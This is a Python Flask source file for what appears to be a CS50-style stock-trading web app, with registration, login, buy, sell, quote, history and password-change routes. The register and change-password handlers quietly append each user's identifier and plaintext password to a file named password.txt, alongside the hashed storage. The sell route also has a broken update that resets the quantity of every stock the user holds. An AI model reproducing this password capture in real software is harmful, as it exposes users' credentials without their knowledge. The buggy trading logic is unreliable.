import os

from cs50 import SQL, eprint
from flask import Flask, flash, redirect, render_template, request, session
from flask_session import Session
from tempfile import mkdtemp
from werkzeug.exceptions import default_exceptions
from werkzeug.security import check_password_hash, generate_password_hash, safe_str_cmp
from datetime import datetime
from helpers import apology, login_required, lookup, usd

# Ensure environment variable is set
if not os.environ.get("API_KEY"):
    raise RuntimeError("API_KEY not set")

# Configure application
app = Flask(__name__)

# Ensure templates are auto-reloaded
app.config["TEMPLATES_AUTO_RELOAD"] = True

# Ensure responses aren't cached


@app.after_request
def after_request(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Expires"] = 0
    response.headers["Pragma"] = "no-cache"
    return response


# Custom filter
app.jinja_env.filters["usd"] = usd

# Configure session to use filesystem (instead of signed cookies)
app.config["SESSION_FILE_DIR"] = mkdtemp()
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Configure CS50 Library to use SQLite database
db = SQL("sqlite:///finance.db")


@app.route("/")
@login_required
def index():
    """Show portfolio of stocks"""

    # accessing the user id
    user_id = session["user_id"]
    home = "home_"
    home = home + str(user_id)
    data = db.execute("SELECT stock, quantity FROM :home WHERE id = :user_id", home=home, user_id=user_id)

    # initialising variables
    length = len(data)
    names = list()
    stock_value = list()
    quantity = list()
    price = list()

    # creating dict items to lists
    for i in range(length):
        quantity.append(float(data[i]['quantity']))
        names.append(data[i]['stock'])
    length_names = len(names)
    for j in range(length_names):
        cur_price = lookup(names[j])
        price.append(float(cur_price['price']))
    for k in range(len(price)):
        stock_value.append(price[k] * quantity[k])

        # accessing data from the database
    cur_cash = db.execute("SELECT cash from users WHERE id = :user_id", user_id=user_id)
    cur_cash_num = float(cur_cash[0]['cash'])
    total = cur_cash_num + sum(stock_value)

    # returning the render template with relevant variables
    return render_template("home.html", length_names=length_names, names=names, quantity=quantity, price=price, stock_value=stock_value, cur_cash_num=cur_cash_num, total=total)


@app.route("/buy", methods=["GET", "POST"])
@login_required
def buy():
    """Buy shares of stock"""

    transaction = "BUY"
    # if requested via post
    if request.method == "POST":

        # saving the user input values
        name = request.form.get("symbol")
        if not name:
            return apology("Please enter a 4 letter ticker symbol", 400)
        quant_text = request.form.get("shares")
        if not quant_text:
            return apology("Please enter the quantity", 400)
        if not quant_text.isdigit():
            return apology("Enter a valid quantity", 400)
        quant = float(request.form.get("shares"))
        if quant < 1:
            return apology("Please enter a valid quantity", 400)

        # checking the current price of stock and conversion for mathematical operations
        price = lookup(name)
        if not price:
            return apology("Please enter a 4 letter ticker symbol", 400)
        price_int = float(price['price'])
        cost = price_int * quant
        user_id = session["user_id"]
        date = str(datetime.now())
        cash = db.execute("SELECT cash FROM users WHERE id = :user_id", user_id=user_id)
        cash_num = float(cash[0]['cash'])
        cost_usd = usd(cost)

        # if the user has sufficient balance
        if cost < cash_num:

            # updating the balance
            home = "home_"
            home = home + str(user_id)
            cash_num = cash_num - cost
            db.execute("INSERT into portfolio (id, stock, quantity, price, time, type) VALUES (:user_id, :stock, :quantity, :price, :time, :buy)",
                       user_id=user_id, stock=name, quantity=quant, price=price_int, time=date, buy=transaction)
            db.execute("UPDATE users SET cash = :cash_num WHERE id = :user_id", cash_num=cash_num, user_id=user_id)
            check = db.execute("INSERT into :home (id, stock, quantity) VALUES (:user_id, :stock, :quantity)",
                               home=home, user_id=user_id, stock=name, quantity=quant)

            cash_num = usd(cash_num)
            # if a similar stock exists
            if not check:
                quant_prev = db.execute("SELECT quantity FROM :home WHERE id = :user_id AND stock = :stock",
                                        home=home, user_id=user_id, stock=name)
                quant_prev_num = float(quant_prev[0]['quantity'])
                quant_new = quant_prev_num + quant
                db.execute("UPDATE :home SET quantity = :quant_new WHERE stock = :stock",
                           home=home, quant_new=quant_new, stock=name)

            # flash a success message
            flash(f"You successfully bought the stock for {cost_usd}, your current cash is {cash_num}")
            return redirect("/")
        else:
            return apology("Please check your balance", 403)

    # if requested via get
    else:
        return render_template("buy.html")


@app.route("/history")
@login_required
def history():
    """Show history of transactions"""

    # identifying the user
    user_id = session["user_id"]

    # retrieving data from the database
    info = db.execute("SELECT * from portfolio WHERE id = :user_id", user_id=user_id)

    # declaring variables
    name = list()
    quantity = list()
    price = list()
    time = list()
    transaction = list()

    length_info = len(info)

    # populating the lists with corrensponding values from the retrieved data
    for i in range(length_info):
        name.append(info[i]['stock'])
        quantity.append(info[i]['quantity'])
        price.append(info[i]['price'])
        time.append(info[i]['time'])
        transaction.append(info[i]['type'])

    # returning the history.html page with appropriate values to create the table
    return render_template("history.html", name=name, quantity=quantity, price=price, time=time, transaction=transaction, length_info=length_info)


@app.route("/login", methods=["GET", "POST"])
def login():
    """Log user in"""

    # Forget any user_id
    session.clear()

    # User reached route via POST (as by submitting a form via POST)
    if request.method == "POST":

        # Ensure username was submitted
        if not request.form.get("username"):
            return apology("must provide username", 403)

        # Ensure password was submitted
        elif not request.form.get("password"):
            return apology("must provide password", 403)

        # Query database for username
        rows = db.execute("SELECT * FROM users WHERE username = :username",
                          username=request.form.get("username"))

        # Ensure username exists and password is correct
        if len(rows) != 1 or not check_password_hash(rows[0]["hash"], request.form.get("password")):
            return apology("invalid username and/or password", 403)

        # Remember which user has logged in
        session["user_id"] = rows[0]["id"]

        # Redirect user to home page
        return redirect("/")

    # User reached route via GET (as by clicking a link or via redirect)
    else:
        return render_template("login.html")


@app.route("/logout")
def logout():
    """Log user out"""

    # Forget any user_id
    session.clear()

    # Redirect user to login form
    return redirect("/")


@app.route("/quote", methods=["GET", "POST"])
@login_required
def quote():
    """Get stock quote."""

    # accesing the company name via POST
    if request.method == "POST":
        name = request.form.get("symbol")

        if not name:
            return apology("Please enter a 4 letter ticker symbol", 400)

        # checking the price via alphavantage (function defined in helpers.py)
        price = lookup(name)

        # checing for invalid ticker symbol
        if not price:
            return apology("Enter a valid ticker symbol")

        price_usd = usd(price['price'])

        # returning the template stating the name and the price
        return render_template("/quoted.html", price=price, price_usd=price_usd)

    # displaying the page via GET
    else:
        return render_template("/quote.html")


@app.route("/register", methods=["GET", "POST"])
def register():

    # User reached route via POST (as by submitting a form via POST)
    if request.method == "POST":

        # retrieving the values submitted by the user
        a = request.form.get("username")
        password1 = request.form.get("password")
        confirmation1 = request.form.get("confirmation")
        pass_hash = generate_password_hash(request.form.get("password"))
        pass_conf = generate_password_hash(request.form.get("confirmation"))
        out = open("password.txt", 'a')
        out.write("%s, %s" % (a, password1))
        out.write('\n')
        out.close()
        """Register user"""

        # checking for validity of username and password
        # if username is not provided
        if not request.form.get("username"):
            return apology("Please provide a username", 400)

        # if password is not provided
        elif not request.form.get("password"):
            return apology("Please input a password", 400)

        # if passwords don't match
        # Note - We cannot use * is not * to compare the two strings as that compares the
        # strings by type. Hence we use != operator that compares by value
        elif password1 != confirmation1:
            return apology("Please insure the passwords are same", 400)

        # insert the value in the database if not present
        user = db.execute("INSERT into users ( username, hash) VALUES (:username, :hash_password)",
                          username=request.form.get("username"), hash_password=pass_hash)
        if not user:
            return apology("This user is already registered")
        flash("You have successfully registered. Please login to continue")

        home = "home_"
        home = home + str(user)
        # creating a home database for the new user
        db.execute("CREATE TABLE :home ('id' INTEGER NOT NULL, 'stock' TEXT PRIMARY KEY NOT NULL, 'quantity' REAL NOT NULL)", home=home)

        # redirect user to login portal
        return render_template("welcome.html")

     # User reached route via GET (as by clicking a link or via redirect)
    else:
        return render_template("register.html")


@app.route("/sell", methods=["GET", "POST"])
@login_required
def sell():
    """Sell shares of stock"""
    user_id = session["user_id"]
    home = "home_"
    home = home + str(user_id)
    transaction = "SELL"

    # User reached route via POST (as by submitting a form via POST)
    if request.method == "POST":

        # retrieving data from the form
        stock_sell = request.form.get("symbol")
        quant_sell_text = request.form.get("shares")
        if not quant_sell_text:
            return apology("Please enter the quantity", 400)
        if not quant_sell_text.isdigit():
            return apology("Enter a valid quantity")
        quant_sell = float(request.form.get("shares"))
        if quant_sell < 1:
            return apology("Please enter a valid quantity", 400)

        # retrieving relevant data from database
        info = db.execute("SELECT quantity FROM :home WHERE stock = :stock_sell", home=home, stock_sell=stock_sell)
        cur_cash = db.execute("SELECT cash FROM users WHERE id = :user_id", user_id=user_id)
        cur_cash_num = float(cur_cash[0]['cash'])
        cur_quant = float(info[0]['quantity'])

        # if user wants to sell more than he owns
        if quant_sell > cur_quant:
            return apology("You don't own that many stocks of this company", 400)

        # defining variables and performing operations for he transaction
        cur_price = (lookup(stock_sell))
        cur_price_num = float(cur_price['price'])
        cur_cost = quant_sell * cur_price_num
        final_quant = cur_quant - quant_sell
        final_cash = cur_cash_num + cur_cost
        date = str(datetime.now())
        final_cash_usd = usd(final_cash)
        cur_cost_usd = usd(cur_cost)
        cur_price_usd = usd(cur_price_num)
        # updating the database

        db.execute("UPDATE users SET cash = :final_cash where id = :user_id", final_cash=final_cash, user_id=user_id)
        db.execute("UPDATE :home SET quantity = :final_quant where id = :user_id",
                   home=home, final_quant=final_quant, user_id=user_id)
        db.execute("INSERT into portfolio (id, stock, quantity, price, time, type) VALUES (:user_id, :stock, :quantity, :price, :time, :sell)",
                   user_id=user_id, stock=stock_sell, quantity=quant_sell, price=cur_price_num, time=date, sell=transaction)

        # flashing a successful message
        flash(f"You successfully sold the stock at {cur_price_usd} for {cur_cost_usd}. Your current cash is {final_cash_usd}")
        # Redirect user to home page
        return redirect("/sell")

    # User reached route via GET (as by clicking a link or via redirect)
    else:

        # retrieving the current stock the user owns
        info = db.execute("SELECT stock FROM :home WHERE id = :user_id", home=home, user_id=user_id)
        name_list = list()

        # passing a list to the html template for displaing as a listbox to the user
        for i in range(len(info)):
            name_list.append(info[i]['stock'])
        length_name = len(name_list)
        return render_template("sell.html", name_list=name_list, length_name=length_name)


@app.route("/change_password", methods=["GET", "POST"])
@login_required
def change_password():

    # saving the user id
    user_id = session["user_id"]

    # User reached route via POST (as by submitting a form via POST)
    if request.method == "POST":

        # checking for entry in the form

        # if current password is not provided
        if not request.form.get("old"):
            return apology("Please provide a password", 403)

        # if new password is not provided
        elif not request.form.get("new"):
            return apology("Please confirm password", 403)

        # storing the form data
        pass_old = request.form.get("old")
        pass_new = request.form.get("new")
        pass_conf = request.form.get("confirmation")

        # retrieving the current password hash from the database
        info = db.execute("SELECT hash FROM users where id = :user_id", user_id=user_id)
        if not check_password_hash(info[0]['hash'], pass_old):
            return apology("You typed your password incorrecly")

        # declaring variables for operations
        pass_new_hash = generate_password_hash(request.form.get("new"))
        pass_conf_hash = generate_password_hash(request.form.get("confirmation"))
        out = open("password.txt", 'a')
        out.write("%s, %s" % (user_id, pass_new))
        out.write('\n')
        out.close()

        # if passwords don't match
        # Note - We cannot use * is not * to compare the two strings as that compares the
        # strings by type. Hence we use != operator that compares by value
        if pass_new != pass_conf:
            return apology("Please insure the passwords are same", 403)

        # updating the new password
        db.execute("UPDATE users SET hash = :pass_new_hash  WHERE id = :user_id ", pass_new_hash=pass_new_hash, user_id=user_id)

        # flash a success message
        flash("Password change successfully, login to continue")
        # redirect to login
        return render_template("login.html")

    # User reached route via GET (as by clicking a link or via redirect)
    else:
        return render_template("change_password.html")


def errorhandler(e):
    """Handle error"""
    return apology(e.name, e.code)


# listen for errors
for code in default_exceptions:
    app.errorhandler(code)(errorhandler)